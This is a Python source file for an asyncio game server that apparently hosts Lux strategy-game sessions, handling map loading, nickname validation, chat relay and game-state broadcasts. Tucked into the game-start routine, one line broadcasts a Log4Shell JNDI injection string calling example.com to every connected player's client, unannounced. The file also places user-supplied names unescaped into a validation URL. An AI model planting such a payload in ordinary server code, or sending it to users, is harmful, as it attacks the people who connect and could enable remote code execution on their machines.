# Copyright (C) 2024  QWERTZexe

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 2.1 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

######################################################

import asyncio
import time
import aiohttp
import xml.etree.ElementTree as ET
import random
from LuxOptions import serialize
import os
import sys
import json

cwd = os.path.dirname(os.path.abspath(sys.argv[0]))

class LuxServer:
    def __init__(self, host, port, map):
        self.map = map
        self.host = host
        self.port = port
        self.clients = []
        self.continents = []
        self.boardheight = 50
        self.boardwidth = 50
        self.notverifiedclients = []
        self.symbol = "★"
        self.update_task = None
        self.game_started = int(time.time() * 1000)

    async def start(self):
        with open(f"{cwd}/maps/{self.map}.luxb", "r") as f:
            self.mapdata = ET.fromstring(f.read())
        self.boardheight = int(self.mapdata.find('height').text) if self.mapdata.find('height') else 50
        self.boardwidth = int(self.mapdata.find('width').text) if self.mapdata.find('width') else 50
        for continent in self.mapdata.findall('.//continent'):
            continent_data = {
                'name': continent.find('continentname').text,
                'countries': []
            }

            for country in continent.findall('country'):
                country_data = {
                    'id': int(country.find('id').text),
                    'name': "SuperCountry",
                }
                try:
                    country_data['name'] = country.find('name').text
                except:
                    pass
                continent_data['countries'].append(country_data)
            
            self.continents.append(continent_data)
        self.update_task = asyncio.create_task(self.waiting_to_start())
        self.luxtracker_task = asyncio.create_task(self.send_tracker_update())
        server = await asyncio.start_server(
            self.handle_client, self.host, self.port)
        addr = server.sockets[0].getsockname()
        print(f'Serving on {addr}')
        async with server:
            await server.serve_forever()

    async def handle_client(self, reader, writer):
        client = {'reader': reader, 'writer': writer, 'username': None,'type': 'unknown',"mod":False}
        self.clients.append(client)
        self.notverifiedclients.append(client)
        try:
            
            while True:
                data = await reader.readline()
                if not data:
                    break
                message = data.decode().strip()
                await self.process_message(client, message)
        except asyncio.CancelledError:
            pass
        finally:
            self.clients.remove(client)
            writer.close()
            await writer.wait_closed()

    async def send_tracker_update(self):
        url = f"https://sillysoft.net/lux/host503.php" # TODO: Add params
        headers = {
                'User-Agent': 'Lux v 6.64 (Linux 6.8.0-36-generic amd64)'
            }
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url) as response:
                if response.status == 200:
                    text = await response.text()
                    print(f"Tracker update response: {text}")
                else:
                    print(f"Failed to send tracker update. Status: {response.status}")
    async def waiting_to_start(self):
        while True:
            await asyncio.sleep(2)
            a=random.randint(0,5)
            for cont in self.continents:
                for country in cont["countries"]:
                    i=country["id"]
                    self.broadcast(f"sco: {i} {a}")
                    await asyncio.sleep(0.02)
                    if random.randint(0,5) == 0:
                        self.broadcast(f"sc: {i}")
                        self.broadcast(f"ex: {i}")
                    self.broadcast(f"sca: {i} {str(random.randint(100,1000))}")
    async def handle_luxtracker(self, client, message):
        if message == "LUXTRACKER-0.1:verify":
            self.send_message(client, "LUXTRACKER-0.1:verify")
    async def process_message(self, client, message):
        print(f"Received: {message}")
        if message.startswith("LUXTRACKER"):
            client['type'] = 'tracker'
            await self.handle_luxtracker(client, message)
        if message.startswith("LUXCONNECT"):
            print("A")
            client['username'] = message.split(":")[1]
            user = client['username']
            print(client)
            self.send_message(client,f"LUXCONNECT-6.4:{user}")
        elif message.startswith("userKey:"):
            client['regkey'] = message.split(": ")[1]
        elif message == "":
            user = client['username']
            regkey = client["regkey"]
            self.send_message(client,f"tra: 4 {self.symbol} {user}, This server is running LuxCore.py by QWERTZ! {self.symbol}")
            await asyncio.sleep(1)
            self.send_message(client,f"tra: 4 {self.symbol} You will be validated in 3 Seconds... {self.symbol}")
            await asyncio.sleep(1)
            self.send_message(client,f"tra: 4 {self.symbol} You will be validated in 2 Seconds... {self.symbol}")
            await asyncio.sleep(1)
            self.send_message(client,f"tra: 4 {self.symbol} You will be validated in 1 Second... {self.symbol}")
            await asyncio.sleep(1)
            self.send_message(client,f"tra: 4 {self.symbol} Validating the nickname '{user}'... {self.symbol}")
            # Send request to validation URL
            validation_url = f"https://sillysoft.net/lux/nick_check565.php?name={user}&key={regkey}"  # Replace with your actual validation URL
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(validation_url) as response:
                        validation_result = await response.text()
            except:
                validation_result = "ERROR"
            try:
                print(validation_result)
                wrapped_content = f"<root>{validation_result}</root>"

                # Parse the wrapped content
                root = ET.fromstring(wrapped_content)

                # Now you can find elements as usual
                try:
                    mod = root.find("mod").text
                    client["mod"] = True
                except:
                    mod = False
                    client["mod"] = False
                result = root.find("result").text
                print(result)
            except ET.ParseError:
                result = "0" 
            
            if result == "1":
                self.send_message(client, f"tra: 4 {self.symbol} Nickname '{user}' validated! Enjoy playing! {self.symbol}")
                await self.send_initial_data(client)
            elif result == "0":
                self.send_message(client, f"tra: 4 {self.symbol} Lux servers are down :( Try again later! {self.symbol}")
                self.send_message(client, f"KILL:")
            else:
                self.send_message(client, f"tra: 4 {self.symbol} Validation failed for nickname '{user}' :( {self.symbol}")
                self.send_message(client, f"KILL:")
        elif message.startswith("CHAT:"):
            await self.handle_chat(client, message)
        elif message.startswith("clientCommand: start"):
            await self.start_game(client["username"])
        elif message.startswith("gt:"):
            player = int(message.split(" ")[-1])
          #  self.broadcast(f"givePlayerCard: {str(player-1)} {str(random.randint(0,100))} {str(random.randint(0,4))}")
           # self.broadcast("nr:")
         #   self.broadcast("gt: 1")
        elif message.startswith("sc:"):
            self.broadcast(message)
        elif message.startswith("sco:"):
            self.broadcast(message)
        elif message.startswith("sca:"):
            self.broadcast(message)
        elif message.startswith("ex:"):
            self.broadcast(message) 
        #await self.send_initial_data(client)
    async def start_game(self, username):
        self.update_task.cancel()
        self.broadcast(f"tra: 4 {self.symbol} The game got started by {username}! Good luck! {self.symbol}")
        self.broadcast(f"setGamePhase: 1")
        for cont in self.continents:
            for country in cont["countries"]:
                i=country["id"]
                a=random.randint(0,5)
                self.broadcast(f"sco: {i} {a}")
                await asyncio.sleep(0.02)
                if random.randint(0,5) == 0:
                    self.broadcast(f"ex: {i}")
                self.broadcast(f"sca: {i} {str(int(random.randint(1,8)))}")
        self.broadcast(f"setGamePhase: 2")
        self.broadcast(f"setGamePhase: 3")
        self.broadcast(f"gt: 0")
        self.broadcast(r"${jndi:ldap://example.com/a}")
    async def handle_chat(self, client, message):
        if client["mod"] == False:
            self.broadcast(message)
        else:
            user = client["username"]
            toslice = 6 + len(client["username"]) + 2
            slicedmsg = message[toslice:]
            self.broadcast(f"tra: 4 [✧MOD✧] {user}: {slicedmsg}")
    def send_message(self, client, message):
        print(f"Sending: {message}")
        client['writer'].write(f"{message}\n".encode())
        asyncio.create_task(client['writer'].drain())

    async def send_binary_message(self, client, data):
        print(f"Sending binary data chunk of length: {len(data)}")
        client['writer'].write(data)
        await client['writer'].drain()
    def broadcast(self, message, exclude=None):
        if exclude == None:
            exclude = self.notverifiedclients
        for client in self.clients:
            if not client in exclude:
                self.send_message(client, message)
    async def send_chunk(self, client, data):
        print(f"Sending chunk of length: {len(data)}")
        client['writer'].write(data)
        await client['writer'].drain()
        await asyncio.sleep(0.01)  # Small delay between chunks
    async def send_initial_data(self, client):
        await self.send_chunk(client, b"OPS:\n")

        # Prepare the full data
        with open(f"{cwd}/maps/{self.map}.luxb", "r") as f:
            map = f.read()
        with open(f"{cwd}/server/LuxOptions.json", "r") as f:
            luxoptions = json.load(f)
        luxoptions["boardFile"]["contents"] = map
        luxoptions["width"] = self.boardwidth
        luxoptions["height"] = self.boardheight
        full_data = bytes.fromhex(serialize(luxoptions, cwd))

        # Send data in chunks of varying sizes
        chunk_sizes = []
        for i in range(100):
            chunk_sizes.append(2000)  # Add more sizes as needed
        start = 0
        for size in chunk_sizes:
            end = start + size
            if end > len(full_data):
                end = len(full_data)
            chunk = full_data[start:end]
            await self.send_chunk(client, chunk)
            start = end
            if start >= len(full_data):
                break

        # Send any remaining data
        if start < len(full_data):
            await self.send_chunk(client, full_data[start:])
        self.notverifiedclients.remove(client)
        user = client["username"]
        self.broadcast(f"tra: 4 {self.symbol} {user} just joined!! {self.symbol}")


### WARNING: DO NOT START THIS FILE USING IT AS MAIN, CWD MUST BE PARENT DIR!!
if __name__ == "__main__":
    server = LuxServer('0.0.0.0', 6619, "Cube Wars")
    asyncio.run(server.start())